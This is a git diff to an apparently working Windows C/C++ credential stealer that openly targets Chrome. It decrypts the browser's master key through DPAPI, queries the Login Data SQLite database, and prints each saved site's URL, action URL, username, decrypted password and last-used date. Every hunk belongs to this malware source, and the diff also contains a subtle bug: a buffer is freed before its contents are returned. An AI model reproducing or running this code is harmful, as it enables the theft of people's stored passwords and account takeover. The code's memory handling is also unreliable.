@@ -11,6 +11,7 @@
 #include <wincrypt.h>
 #include <bcrypt.h>
 #include <stdio.h>
+#include <time.h>
 
 #include <sqlite3.h> //May need to be dynamically Linked for less carbon footprint
 #include <aes_gcm.h>
@@ -18,6 +19,15 @@
 #include <string>
 
 #include <iostream>
+
+//Structure that help with freeing buffers
+struct twoBuf {
+    BYTE* result;
+    char* toBFreed;
+};
+
+
+
 
 //Get Local State
 BYTE* getLocalState(){
@@ -70,39 +80,43 @@ BYTE* getLocalState(){
     return (BYTE*)fileContents; //Don't forget to free later
 }
 
+//Turns Chrome Epochs into Dates
+char* chromeEpochDecode(char* epochTime){
+    if(strtoull(epochTime, NULL, 0) == 0){
+        return (char*) "Never";
+    }
+    time_t epoch = (strtoull(epochTime, NULL, 0)/1000000)-11644473600; //The Extra calculations are because Chrome has there epochs in microseconds dated at a certain day
+    return asctime(gmtime(&epoch));
+}
+
+
 // Decrypt DPAPI
 DATA_BLOB decryptDPAPI(BYTE* encryptedBytes, DWORD encryptBytesSize) {
     DATA_BLOB in;
-    DATA_BLOB entropy;
     DATA_BLOB out;
-    BYTE* entropyBuffer = (BYTE*) malloc (0);
-    if (entropyBuffer == NULL) {
-        printf("Memory not successfully Allocated.\n");
-    }
     BYTE* outBuffer = (BYTE*)malloc(encryptBytesSize);
     //Setting DATA_BLOBS
     in.pbData = encryptedBytes;
     in.cbData = encryptBytesSize;
-    entropy.pbData = entropyBuffer;
-    entropy.cbData = (DWORD)0;
     out.cbData = encryptBytesSize;
     out.pbData = outBuffer;
     
     //DECRYPTING TIME!!!!
     if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)){
+        free(outBuffer);
         return out;
     }
     else{
         printf("Decryption didn't work. ERROR %d", GetLastError());
-        free(entropyBuffer);
         free(outBuffer);
         return out;
     }
 }
 
 //Get Encrpytion Key
-DATA_BLOB getEncryptKey(){
+twoBuf getEncryptKey(){
     BYTE* localState = getLocalState();
+    twoBuf masterKey;
     
     char* osCryptstr = (char*) malloc (1024);
     if (osCryptstr == NULL) {
@@ -157,7 +171,10 @@ DATA_BLOB getEncryptKey(){
     }
     free(buffer);
     
-    DATA_BLOB masterKey = decryptDPAPI(finalKey, bufSize-5);
+    DATA_BLOB masterKeyBlob = decryptDPAPI(finalKey, bufSize-5);
+    free(finalKey);
+    masterKey.result = masterKeyBlob.pbData;
+    masterKey.toBFreed = osCryptstr;
     return masterKey;
 }
 
@@ -251,7 +268,7 @@ char* Crack(char* pass, BYTE* encKey) {
 }
 
 //Loot Chrome Passwords
-wchar_t* GetPass(DATA_BLOB masterKey){
+void GetPass(twoBuf masterKey){
     char* cPassPath = (char*) malloc(512);
     if (cPassPath == NULL) {
         printf("Memory not successfully Allocated.\n");
@@ -267,28 +284,28 @@ wchar_t* GetPass(DATA_BLOB masterKey){
     sqlite3_stmt* stmt;
     sqlite3* db;
 
-    char *query = (char*) "SELECT origin_url, username_value, password_value FROM logins";
+    char *query = (char*) "SELECT origin_url, action_url, username_value, password_value, date_last_used FROM logins";
     if (sqlite3_open(cPassPath, &db) == SQLITE_OK) {
         if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
             //Begin Data Reading
             while (sqlite3_step(stmt) == SQLITE_ROW) {
                 //While we still have data in database
                 char *url = (char*)sqlite3_column_text(stmt,0);
-                char* username = (char*) sqlite3_column_text(stmt,1);
-                char* password = (char*)sqlite3_column_text(stmt,2); //This is the only encrypted field
-                int passSize = sqlite3_column_bytes(stmt, 2);
+                char* actionURL = (char*) sqlite3_column_text(stmt,1);
+                char* username = (char*) sqlite3_column_text(stmt,2);
+                char* password = (char*)sqlite3_column_text(stmt,3); //This is the only encrypted field
+                DOUBLE passSize = sqlite3_column_bytes(stmt, 3);
+                char* dateLastUsed = chromeEpochDecode((char*) sqlite3_column_text(stmt,4));
+                //time_t rawtime = dateLastUsed;
                 printf("Url: %s\n",url);
-                if(username == NULL){
-                    printf("Username: ");
-                }
-                else{
+                printf("Action_URL: %s\n", actionURL);
                 printf("Username: %s\n",username);
-                }
                 
-                char* decrypted =  AESDecrypt(password, passSize, masterKey.pbData);
+                char* decrypted =  AESDecrypt(password, passSize, masterKey.result);
                 if (decrypted != NULL){
-                    printf("Password: %s\n\n", decrypted);
+                    printf("Password: %s\n", decrypted);
                 }
+                printf("Date Last Used: GMT %s\n\n", dateLastUsed);
             }
         }
         else{
@@ -302,11 +319,12 @@ wchar_t* GetPass(DATA_BLOB masterKey){
     }
 
     free(cPassPath);
-    return NULL;
+    free(masterKey.toBFreed);
+    return;
 }
 
 
 int _tmain(int argc, _TCHAR *argv[]){
-    DATA_BLOB encKey = getEncryptKey();
+    twoBuf encKey = getEncryptKey();
     GetPass(encKey);
 }
